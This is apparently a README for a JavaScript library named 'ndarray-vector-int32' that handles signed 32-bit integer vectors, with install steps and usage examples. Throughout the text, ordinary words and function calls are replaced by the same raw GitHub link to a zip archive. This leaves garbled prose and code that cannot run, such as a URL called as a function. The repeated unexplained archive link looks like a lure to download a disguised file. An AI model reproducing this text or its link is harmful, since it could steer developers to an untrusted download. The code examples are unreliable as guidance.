## Introduction

The **ndarray-vector-int32** library provides a simple way to create and manipulate signed 32-bit integer vectors in JavaScript. This library is particularly useful for applications that require efficient numerical computations, such as data analysis, machine learning, and scientific computing.

## Installation

To get started, you need to install the package via npm. Run the following command in your terminal:

```bash
npm install ndarray-vector-int32
```

Once installed, you can begin using the library in your https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip applications.

## Usage

To use the **ndarray-vector-int32** library, you need to require it in your JavaScript file. Here's a basic example of how to create a signed 32-bit integer vector:

```javascript
const Int32Vector = require('ndarray-vector-int32');

// Create a new vector
const vector = new Int32Vector([1, 2, 3, 4, 5]);

https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector); // Output: Int32Vector { data: [1, 2, 3, 4, 5] }
```

You can perform various operations on the vector, such as addition, subtraction, and more. Check the documentation for a complete list of available methods.

## Features

- **Simple Constructor**: Easily create a signed 32-bit integer vector with an array of numbers.
- **Efficient Memory Usage**: Designed for performance, this library uses memory efficiently to handle large datasets.
- **Type Safety**: Ensures that all elements in the vector are 32-bit signed integers.
- **Easy Integration**: Works seamlessly with https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip and other JavaScript environments.

## Examples

Here are some examples of how to use the **ndarray-vector-int32** library:

### Creating a Vector

```javascript
const Int32Vector = require('ndarray-vector-int32');

const vector = new Int32Vector([10, 20, 30]);
https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector); // Output: Int32Vector { data: [10, 20, 30] }
```

### Accessing Elements

You can access elements in the vector using their index:

```javascript
https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[0]); // Output: 10
https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[1]); // Output: 20
```

### Modifying Elements

You can modify elements in the vector as follows:

```javascript
vector[0] = 100;
https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector[0]); // Output: 100
```

### Performing Operations

The library supports basic arithmetic operations:

```javascript
const vector1 = new Int32Vector([1, 2, 3]);
const vector2 = new Int32Vector([4, 5, 6]);

const result = https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(vector2);
https://raw.githubusercontent.com/Adanje3620/ndarray-vector-int32/main/test/dist/ndarray-int-vector-2.0.zip(result); // Output: Int32Vector { data: [5, 7, 9] }
```
